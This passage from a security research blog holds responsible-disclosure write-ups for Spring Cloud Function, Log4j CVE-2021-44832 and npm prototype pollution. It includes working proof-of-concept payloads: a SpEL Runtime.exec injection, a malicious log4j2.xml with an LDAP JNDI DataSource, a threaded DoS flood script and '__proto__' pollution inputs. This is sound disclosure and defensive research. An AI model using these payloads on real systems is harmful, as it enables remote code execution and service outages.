that caches functions that have already been invoked in order to save time on subsequent lookups.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-1.png\" style=\"width: 100%;\"/>\n\nThe check if the function is in the cache is done in the doLookup call ([line 114](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L114)). In case the function is null, indicating it is not in the cache, the process of retrieving the function is performed. After finding the function the [register](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158) call will add the function to the cache ([line 148](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L148)).\n\nKnowing the feature discussed before, the splitting of functions via the characters ‘,’ or ‘|’ is done after the cache check and before the insertion of a new lookup result (the red square, [line 118](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L118)), which means that calling a function with ‘,’ or ‘|’ at the end will add it to the cache even if all chained functions are already in it. So, we can populate a list with endless permutations of known functions, all of whom will be added to the router. Flooding the router with XXX results will eventually slow down the server, resulting in significant delay and eventual timeouts, and will inevitably crash the application by exhausting memory.  Even with the spring-boot-starter-security dependency (which prevents unauthorized execution of bean functions), we can achieve denial-of-service since the verification of invocation permissions is only made after the lookup function.\n\n## Proof Of Concept\nUsing the sample code created by Spring, [function-sample-pojo](https://github.com/spring-cloud/spring-cloud-function/tree/v4.0.0-M2/spring-cloud-function-samples/function-sample-pojo), which has the following functions\n* Uppercase\n* Lowercase\n* Words\n(Note that for the PoC to work, we need to call a function that exists so it will register in the cache).\n```\nPOST  http://host/uppercase,\npayload: {‘a’:1}\n```\nAs you can see below, the cache increases in size over time and affects the response time accordingly (the functionRegistrations list is in the [register](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158) function):\n\n<img src=\"/img/blogs/spring-function-cloud/Image-2.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-3.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-4.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-5.png\" style=\"width: 100%;\"/>\n\n## Mitigation\nUpdate Spring Cloud Function to 3.2.6 or above.\n\n# Unintended Function Invocations\n## Technical Details\nThis bug affects the same [lookup](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103) function, which attempts to determine if the function itself should be executable as a bean function. In the [second line](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L108), the function name passes through the [normalizeFunctionDefinition](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216) function –\n\n<img src=\"/img/blogs/spring-function-cloud/Image-6.png\" style=\"width: 100%;\"/>\n\nThis function will create a list named ‘eligibleFunction’ which contains the function a user can invoke. In case there is only one function defined, it will replace whatever name it got to that ‘default’ function name, otherwise, it will return the input as-is.\n\nHere, similar to the aforementioned DoS issue, the splitting of the function names is done after this function, so if the function name contains ‘,’ or ‘|’, the replacement to the ‘default’ function won’t happen.\n\nIn the following example, we add a cloud.fn dependency which is meant to add a function to our project (using the function-sample-pojo project as an example).\n\n<img src=\"/img/blogs/spring-function-cloud/Image-7.png\" style=\"width: 100%;\"/>\n\nWe have the following list:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-8.png\" style=\"width: 100%;\"/>\n\nDespite having an ‘eligibleFunction’ list, later in the lookup function, Spring Cloud Function will try to determine the function in the [‘this.discoverFunctionInBeanFactory(functionName);](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L124)’ line. The [discoverFunctionInBeanFactory](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L164) function searches in the whole beanFactory of the applicationContext, which is actually far more extensive than the list in eligibleFunctions and contains way more functions than intended and defined by developers via bean annotations, encompassing the entire bean library in ApplicationContext:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-9.png\" style=\"width: 100%;\"/>\n\nAlthough we have here over 580 other functions, other filters are being done later in the lookup function before registering.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-10.png\" style=\"width: 100%;\"/>\n\nThe red highlights are the steps the functionCandidate needs to pass in order to register a function - but registering a function does not mean we can invoke them. These functions were not meant to execute from the function router like that; this results in unexpected behavior, where unintended functions attempt to execute but fail due to extraneous errors.  This is best shown in two common exceptions when attempting to invoke arbitrary functions from ApplicationContext:\n* Casting to a Supplier exception – happens to void functions, as these functions must have a return value\n* Argument mismatch – the input of the function is an object without a default/nullary constructor. Invocation fails without a simple constructor. (We can control to a certain extent the input type via different post payloads so sometimes this exception could be avoided)\n\nThe red highlighted code checks filter many beans from ApplicationContext **but not all**. For example, if the bean is a class, it must have one ‘functional’ function – a class pattern where the class has one function aside from the constructor. This means that while not all ApplicationContext beans are accessible, some beans are exposed, and some are not in a way that is completely tangential to whether they should have been exposed and invoked from URL function invocation.\n\nThe following code will dump **all** the functions a user can invoke in ApplicationContext, and when running this will show many more invokable functions than intended.\n\n```java\npublic static void main(String[] args) {\n\t\tCollection registeredBeans = new ArrayList<String>();\n\t\tCollection supplierRegisteredBeansExceptions = new ArrayList<String>();\n\t\tApplicationContext context = SpringApplication.run(DemoApplication.class, args);\n\t\tFunctionCatalog catalog = context.getBean(FunctionCatalog.class);\n\t\tSystem.out.println(\"Num of Beans: \" + context.getBeanDefinitionNames().length);\n\t\tfor (String functionName : context.getBeanDefinitionNames())\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tSimpleFunctionRegistry.FunctionInvocationWrapper function = (SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);\n\t\t\t\tif (function != null)\n\t\t\t\t{\n\t\t\t\t\t//get non Supplier beans\n\t\t\t\t\tif (function.isSupplier())\n\t\t\t\t\t{\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t((Supplier)function.getTarget()).get();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch (ClassCastException exception){supplierRegisteredBeansExceptions.add(functionName);}\n\t\t\t\t\t}\n\t\t\t\t\tregisteredBeans.add(functionName);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"Num of registered functions: \" + registeredBeans.size());\n\t\tSystem.out.println(registeredBeans);\n\t\tCollection nonSupplierRegisteredBeans = new HashSet<String>( registeredBeans );\n\t\tnonSupplierRegisteredBeans.removeAll(supplierRegisteredBeansExceptions);\n\t\tSystem.out.println(\"Non Supplier Functions: \" + nonSupplierRegisteredBeans);\n}\n```\nAs an example of an output, we can see some internal functions, configurations, and more:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-11.png\" style=\"width: 100%;\"/>\n\nThe applicationContext beans are dependent on user-code and dependencies imported into the project (just by adding dependencies to the pom.xml - more beans are added as per Spring’s core design, and thus more bean functions to potentially invoke). The impact of this can vary and is highly dependent on the application, its dependencies, and internal bean implementation, but the nature of this function invocation is entirely arbitrary.\n\nWhen we tried to find some interesting functions to invoke, we didn’t encounter anything with a real impact. But keep in mind that the search is endless and could change depending on the environment.\n\nHere is an example of an arbitrary function we can invoke that won’t cause any threat (org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration):\n\n<img src=\"/img/blogs/spring-function-cloud/Image-12.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-13.png\" style=\"width: 100%;\"/>\n\n(In order for the function to run it needs an input and depending on the type of parameter the post body needs to change. As you will see in the next example showing a Boolean parameter).\n\nA second example is when having the dependency org.apache.camel.springboot:camel-geocoder-starter-3.17.0 in the pom.xml. The class where we invoke the function is in the spring-cloud-commons package, but camel-geocoder-starter actually inserts this class into the application context. \n[createBuilder](https://github.com/spring-cloud/spring-cloud-commons/blob/v4.0.0-M2/spring-cloud-commons/src/main/java/org/springframework/cloud/commons/httpclient/DefaultOkHttpClientFactory.java#L47) in the DefaultOkHttpClientFactory class is the function, it changes ‘this.builder’ to disable SSL validation or enable it.\n\nThe screenshots below show that the builder changes are saved to ‘this’ object. Thus, we can change the builder to disable SSL validation for subsequent invocations. The severity of this specific invocation is questionable since the usage of this factory elsewhere in code is complicated, but this demonstrates a real example of an attacker changing a configuration by altering a global flag through a bound object that doesn’t seem to be the author’s intent.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-14.png\" style=\"width: 100%;\"/>\n\n2nd invocation, the sslSockerFactoryOrNull is changed from the first call:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-15.png\" style=\"width: 100%;\"/>\n\n## Potential Impact Demonstration\n**The following code is written by us (Checkmarx Researchers.) It is completely fabricated and doesn’t exist in Spring. The purpose of this code is to demonstrate the potential impact of the issue, since the function itself is not inherently dangerous without user input, yet it is arbitrarily exposed via Spring Cloud Function.**\nHaving the following code and the dependency - org.springframework.amqp:spring-rabbit in the project. \n\n```java\nimport org.springframework.amqp.core.Message;\nimport org.springframework.amqp.rabbit.core.RabbitTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class RabbitTest {\n\n    public RabbitTest(){}\n\n    public Boolean checkMandatory(RabbitTemplate rabbitTemplate) {\n        return rabbitTemplate.isMandatoryFor(new Message(new byte[]{'a'}));\n    }\n}\n```\n\nIn this example, the @Component annotation adds the class to the application context. (Note that no @Bean annotation is required; components for dependency injection also end up in the application context). Since it’s a class, it must have one functional method according to the checks made in the lookup function (only one method apart from the constructor). Now we can call the checkMandatory function with the rabbitTest URI. \n\nThe object [RabbitTemplate](https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java) has a default/nullary constructor and a [setter](https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java#L529) that will take a string and parse a SpEL expression out of it. The isMandatoryFor function will execute getValue to that malicious expression, which, if you are familiar with SPeL vulnerabilities, results in expression execution, which, in SPeL’s case, is equivalent to a Java code Injection:\n\n```java\nPOST http://springhost/rabbitTest\n \n{\"mandatoryExpressionString\":\"T(java.lang.Runtime).getRuntime().exec(\\\"open -a /System/Applications/Calculator.app\\\")\"}\n```\n\n(Known issue - In case this doesn’t work and runs the default function, because of the [normalizeFunctionDefinition](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216) replacement, we can bypass this validation by calling  http://springhost/rabbitTest, (note the comma) . This will register the function to the cache and then we can call it again normally and execute it):\n\nThis execution will result in RCE:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-16.png\" style=\"width: 100%;\"/>\n\nAnother example with the dependency org.springframework.cloud:spring-cloud-starter-stream-rabbit, we get exposed to the function [spelConverter](https://github.com/spring-cloud/spring-cloud-stream/blob/v4.0.0-M2/core/spring-cloud-stream/src/main/java/org/springframework/cloud/stream/config/SpelExpressionConverterConfiguration.java#L89), which gets a string and returns an Expression. With the feature of passing one’s output to another’s input, having a class like so, this is also vulnerable:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-17.png\" style=\"width: 100%;\"/>\n\nWe can’t directly call ‘get’ since the Expression object doesn’t have a default/nullary constructor, but it’s possible with the output of spelConverter. This hints at a much deeper issue where, using certain dependencies, a gadget of chained application context beans could be crafted.\n\nThe examples above have some custom code written, but here are some interesting functions we found only by adding dependencies to the pom.xml without a real impact. \n\n<img src=\"/img/blogs/spring-function-cloud/Image-18.jpg\" style=\"width: 100%;\"/>\n\n## Mitigation\nUpdate Spring Cloud Function to 3.2.6 or above, which contains basic filtering of some beans, use the configuration spring.cloud.function.ineligible-definitions to exclude additional unintended functions. \n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2/06/2022 | Vulnerability was reported responsibly. |\n| 15/06/2022 | Checkmarx SCA customers using spring function cloud were warned and provided mitigation guidance,  without exposing the technical details of the findings. |\n| 15/06/2022 | Fixed version was released. |\n| 16/06/2022 | CVE-2022-22979 was assigned. |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.\n\nSolutions like [Checkmarx SCA](https://checkmarx.com/product/cxsca-open-source-scanning/?) are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.\n\n# References\n* https://advisory.checkmarx.net/advisory/CX-2022-5010/\n* https://advisory.checkmarx.net/advisory/CX-2022-5009/\n* https://tanzu.vmware.com/security/cve-2022-22979\n* [DoS Fix](https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09)\n* [Unintended function invocation mitigation](https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab)","tags":["java","dos","denial of service","code execution"]},{"title":"Deserialization attack via JDBC Appender in log4j","url":"/2021/12/29/Deserialization attack via JDBC Appender in log4j/","content":"## Summary\nApache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a Arbitrary Code Execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.\n\n## Product\nApache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4).\n\n## Impact\nIn case an attacker can modify the logging configuration (due to fetching remote configuration feature in log4j this opens different attack vectors, such as MITM, DNS poisoning, lateral movement after gaining access to a storage node) an Arbitrary Code Execution could be achieved.\n\n## Steps to reproduce\nUsing the same LDAP server as done in the CVE-2021-44228 PoC, all we need to do is to run: \n \n```java\nSystem.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/config.xml\"); \nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); \nfinal Logger logger = LogManager.getLogger(log4j.class); \n```\n\nAnd to serve the following config.xml: \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<Configuration status=\"error\"> \n    <Appenders> \n        <JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\"> \n            <DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\" /> \n            <Column name=\"eventDate\" isEventTimestamp=\"true\" /> \n            <Column name=\"level\" pattern=\"%level\" /> \n            <Column name=\"logger\" pattern=\"%logger\" /> \n            <Column name=\"message\" pattern=\"%message\" /> \n            <Column name=\"exception\" pattern=\"%ex{full}\" /> \n        </JDBC> \n    </Appenders> \n    <Loggers> \n        <Root level=\"warn\"> \n            <AppenderRef ref=\"databaseAppender\"/> \n        </Root> \n    </Loggers> \n</Configuration> \n```\n\n### Expected result:\nWhen initializing the logger object, a request to the config.xml will be made. In the loading process, an attempt to load the DataSource will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and run. \n\n## Remediation\nUpdate log4j to one of the fixed versions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx Security Researchers [Yaniv Nizry](https://twitter.com/ynizry) and [Liad Levy](https://twitter.com/liad__levy).\n\n## Resources\n1. [Release Candidate](https://lists.apache.org/thread/kflcpnczh2y0vhfxn5fd0fnxb80l5kwm) \n2. [Commit](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16)\n3. [Blog Post](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)\n","tags":["java","deserialization","log4j","log4j2"]},{"title":"CVE-2021-44832: Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element","url":"/2021/12/27/Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element/","content":"# Introduction\nLog4j is a highly popular logging package in Java that is used widely by developers, companies such as Google, Steam, Apple, Minecraft, and even on one of NASA’s Mars rovers utilize this package. On December 9th, the most critical zero-day exploit in recent years was discovered in log4j. The vulnerability [CVE-2021-44228](https://checkmarx.com/blog/apache-log4j-remote-code-execution-cve-2021-44228/?) was unauthenticated, zero-click RCE (Remote Code Execution) by logging a certain payload.\n\nFollowing that, a big hype was created in the world and especially in the security community, making many researchers interested in logging packages. Several other vulnerabilities and bypasses were found and published since then in log4j and other logging packages, find out more on our [“Variants and Updates”](https://checkmarx.com/resources/homepage/apache-log4j-rce-variants-and-updates?) blog.\n\n\n# Technical Details\nBeing extremely focused and dedicated researchers, we wanted to do a security audit ourselves on the log4j package in the hope of finding something interesting. And after a week of reviewing the code and testing, we encountered a new undiscovered deserialization security vulnerability. This vulnerability doesn’t use the disabled lookup feature.\n\nThe complexity of this vulnerability is higher than the original CVE-2021-44228 since it requires the attacker to have control over the configuration (like the ‘logback’ vulnerability [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550)). **In log4j there is a feature to load a remote configuration file** that isn't part of the local codebase and opens various attack vectors such as [MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (man in the middle) attack, DNS poisoning, lateral movement after gaining access to a storage node.\n\nWhile looking at log4j features we came across the [‘Appender’](https://logging.apache.org/log4j/2.x/manual/appenders.html) functionalities. Appenders are basically where to output the logs, so we have for example ConsoleAppender, FileAppender, etc.\n\nThe [JDBCAppender](https://logging.apache.org/log4j/2.x/manual/appenders.html#JDBCAppender) caught our eyes since there are some public ways of getting RCE via JDBC Java deserialization (see this [Blackhat](https://www.youtube.com/watch?v=Lv9BC_bYaI8) talk By Yongtao Wang, Lucas Zhang and Kunzhe Chai for more information).\n\nBut before getting into the JDBC deserialization in log4j, we noticed that in the documentation there is a way to configure log4j so that it will fetch the database source dynamically and remotely via JNDI. The configuration of the remote database location is done with the DataSource element. Taking the example from the official documentation:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration status=\"error\">\n\t<Appenders>\n\t<JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\">\n\t\t     <DataSource jndiName=\"java:/comp/env/jdbc/LoggingDataSource\" />\n\t\t <Column ...\n\t</JDBC>\n </Appenders>\n…\n</Configuration>\n```\nthere was not any restriction of putting an arbitrary LDAP remote URL, thus making it potential to the classic JNDI:LDAP deserialization vector (more information on the [Blackhat](https://www.youtube.com/watch?v=Y8a5nB-vy78) talk by Alvaro Munoz & Oleksandr Mirosh).\nAfter changing the tag to:\n```xml\n<DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\"/>\n```\nour payload was triggered, and we executed calc.exe on the machine.\n<img src=\"/img/blogs/log4j2/Image-1.png\" style=\"width: 100%;\"/>\n<video controls=\"\" src=\"/videos/log4j2/Video-1.mov\" style=\"width: 100%;\"></video>\n\n`DataSource dataSource = (DataSource)context.lookup(jndiName);`\n\nIs the line that triggers the JNDI lookup, it is in `DataSourceConnectionSource -> createConnectionSource` which is called from the `PluginBuilder`. And this is also the reason for the crash since we cannot cast the object to DataSource (the crash happens after the deserialization). The lookup function will do LDAP lookup to the “RemainingName” which is the DN (what comes after the slash).\n\nTo understand the calls better, we can follow the callgraph bottom up to see who calls who:\n```\ncreateConnectionSource:75, DataSourceConnectionSource (org.apache.logging.log4j.core.appender.db.jdbc)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\nbuild:136, PluginBuilder (org.apache.logging.log4j.core.config.plugins.util)\ncreatePluginObject:1120, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1045, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)\ndoConfigure:651, AbstractConfiguration (org.apache.logging.log4j.core.config)\ninitialize:247, AbstractConfiguration (org.apache.logging.log4j.core.config)\nstart:293, AbstractConfiguration (org.apache.logging.log4j.core.config)\nsetConfiguration:626, LoggerContext (org.apache.logging.log4j.core)\nreconfigure:699, LoggerContext (org.apache.logging.log4j.core)\nreconfigure:716, LoggerContext (org.apache.logging.log4j.core)\nstart:270, LoggerContext (org.apache.logging.log4j.core)\ngetContext:155, Log4jContextFactory (org.apache.logging.log4j.core.impl)\ngetContext:47, Log4jContextFactory (org.apache.logging.log4j.core.impl)\ngetContext:196, LogManager (org.apache.logging.log4j)\ngetLogger:599, LogManager (org.apache.logging.log4j)\nmain:11, log4j\n```\n\n# Steps To Reproduce\nFor the vulnerability to be exploitable, Log4J’s configuration file needs to be loaded from an external source. This can be a remote FTP server, cloud storage etc. An attacker could use technics such as DNS poisoning and MITM in order to inject a uniquely crafted configuration file and ultimately exploit the vulnerability.\n\n1. Fetching Remote configuration via HTTP\n```java\nSystem.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/log4j2.xml\");\n```\n2. Using the same LDAP (Lightweight Directory Access Protocol) server as done in the CVE-2021-44228 PoC (Proof of Concept), all we need to do is to run:\n```java\n//log4j.java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class log4j {\n    static {\n        System.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/log4j2.xml\");\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");\n    }\n    private static final Logger logger = LogManager.getLogger(log4j.class);\n\n    public static void main(String[] args) {\n    }\n}\n```\n3. Inject the malicious log4j2.xml file into the response:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration status=\"error\">\n    <Appenders>\n        <JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\">\n            <DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\" />\n            <Column name=\"eventDate\" isEventTimestamp=\"true\" />\n            <Column name=\"level\" pattern=\"%level\" />\n            <Column name=\"logger\" pattern=\"%logger\" />\n            <Column name=\"message\" pattern=\"%message\" />\n            <Column name=\"exception\" pattern=\"%ex{full}\" />\n        </JDBC>\n    </Appenders>\n    <Loggers>\n        <Root level=\"warn\">\n            <AppenderRef ref=\"databaseAppender\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n```\n\n# Expected Results\nWhen initializing the logger object, a request to the remote log4j2.xml will be made. In the loading process, an attempt to load the DataSource object will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and executed.\n\n# Apache’s Fix\nOn December 27th the fixing commit [05db5f9](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16) was released. As we can see before the fix, the lookup of the DataSource was made directly with the InitialContext, which is a Java internal class.\n\n<img src=\"/img/blogs/log4j2/Image-2.jpg\" style=\"width: 100%;\"/>\n\nIn version 2.17.1 the lookup uses the log4j’s JNDI wrapper, and thus disables the lookup. A new log4j2.enableJndiJdbc system property was added to reenable this functionality.\n\nThis is the reason why the vulnerability is exploitable using log4j’s default system properties.\n\n# Why Is This Interesting?\nThere are two main configuration scenarios when using Log4J.\n\n* The configuration is on a remote location. This can be useful for developers in case of multiple products sharing the same logging configuration. In this case, an attacker could expand their control over a network by gaining access to the node that serves the configuration file, or use techniques such as MITM and DNS poisoning to inject a malicious configuration file and trigger code execution.\n* The configuration is a local file and is part of the repository or project. This is the case for most products in the wild. Even though this scenario is harder to leverage, an attacker could attempt to alter the configuration file by gaining access to the source code, especially if it’s an open-source project that’s maintained by a community such as GitHub. For example, an attacker could find a popular Java package that’s using Log4J, alter its configuration file, and cause a supply chain attack for developers who are using this package. **Unlike changes to the code itself, configuration files tend to draw less focus and are easier to “sweep under the rug”.**\n\n# Mitigation\nUpgrade your Apache Log4j2 to versions 2.17.1, 2.12.4, and 2.3.2 or above.\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| 27/12/2021 | Responsible disclosure was made to Apache. |\n| 27/12/2021 | Acknowledgment received from Apache. |\n| 28/12/2021 | Checkmarx customers who were using Log4J were warned, without exposing the vulnerability‘s details. |\n| 28/12/2021 | CVE-2021-44832 was assigned to this issue. |\n| 28/12/2021 | Fixed version 2.17.1 was released. |","tags":["java","deserialization","log4j","log4j2"]},{"title":"Prototype pollution in cloneextend","url":"/2021/06/27/Prototype pollution in cloneextend/","content":"## Summary\nAffected versions of cloneextend (npm) are vulnerable to prototype pollution via the clone and extend functions.\n\n## Product\nAll versions of cloneextend npm package.\n\n## Impact\nIf untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.\n\n## Steps to reproduce\n```js\nvar ce = require('cloneextend');\nce.extend({},JSON.parse('{\"__proto__\":{\"polluted\":1}}'))\nconsole.log({}.polluted)\n>1\n \nce.clone(JSON.parse('{\"__proto__\":{\"a\":1}}'))\nconsole.log({}.a)\n>1\n```\n\n### Expected result:\n1 will be printed to the console.\n\n## Remediation\nCurrently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable functions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [NPM Package](https://www.npmjs.com/package/cloneextend)\n","tags":["npm","prototype-pollution"]},{"title":"Prototype pollution in extend2","url":"/2021/06/27/Prototype pollution in extend2/","content":"## Summary\nAffected versions of extend2 (npm) are vulnerable to prototype pollution via the extend function.\n\n## Product\nAll versions of extend2 (npm).\n\n## Impact\nIf untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.\n\n## Steps to reproduce\n```js\nconst extend = require('extend2');\na = {'a':1};\nextend(true, {}, a, JSON.parse('{\"__proto__\":{\"polluted\":1}}'));\nconsole.log({}.polluted);\n```\n\n### Expected result:\n1 will be printed to the console.\n\n## Remediation\nCurrently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable function.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [NPM Package](https://www.npmjs.com/package/extend2)\n","tags":["npm","prototype-pollution"]},{"title":"DoS in Spring Cloud Function","url":"/2021/06/16/DoS in Spring Cloud Function/","content":"## Summary\nIn Spring Cloud Function versions 3.2.5 and older unsupported versions, it is possible for a user who directly interacts with framework provided lookup functionality to cause denial of service condition due to the caching issue in Function Catalog component of the framework. At the time of writing of this CVE such interaction is only possible via spring-cloud-function-web module.\n\n## Product\nSpring Cloud Function versions before 3.2.6.\n\n## Impact\nIn case the web endpoint for function invocation is open a DoS could be achieved.\n\n## Steps to reproduce\n```\nimport threading\ndef a():\n\tfor i in range(100000):\n\t\tresponse =requests.post(f\"http://host/uppercase,\", json={'a':1})\n\t\tif i%100 == 0:\n\t\t\tprint(response.elapsed.total_seconds()) \n\nfor i in range(10):\n\tthreading.Thread(target=a).start()\n\tif i ==9:\n\t\ta()\n\n```\n* replace the name of the function (`uppercase`) with a function that exists\n\n### Expected result:\nThe time for a response will rise and eventually crash the server.\n\n## Remediation\nUpdate Spring Cloud Function to 3.2.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Official advisory](https://tanzu.vmware.com/security/cve-2022-22979)\n2. [Commit](https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09)","tags":["java","dos","denial of service"]},{"title":"Unintended function invocation in Spring Cloud Function","url":"/2021/06/16/Unintended function invocation in Spring Cloud Function/","content":"## Summary\nIn Spring Cloud Function it's possible for users to invoke unintended functions that follow some arbitrary rules. In versions 3.2.6 and above a `spring.cloud.function.ineligible-definitions` configuration was introduced to mitigate the issue but it still requires the user to go over the unintended functions a user might run.\n\n## Product\nSpring Cloud Function versions before 3.2.6.\n\n## Impact\nThe impact is highly dependent on the application context, and on the worse case could lead to RCE. \n\n## Steps to reproduce\n1. Run the  following main function: \n```\npublic static void main(String[] args) {\n\t\tCollection registeredBeans = new ArrayList<String>();\n\t\tApplicationContext context = SpringApplication.run(DemoApplication.class, args);\n\t\tFunctionCatalog catalog = context.getBean(FunctionCatalog.class);\n\t\tSystem.out.println(\"Num of Beans: \" + context.getBeanDefinitionNames().length);\n\t\tfor (String functionName : context.getBeanDefinitionNames())\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tSimpleFunctionRegistry.FunctionInvocationWrapper function = 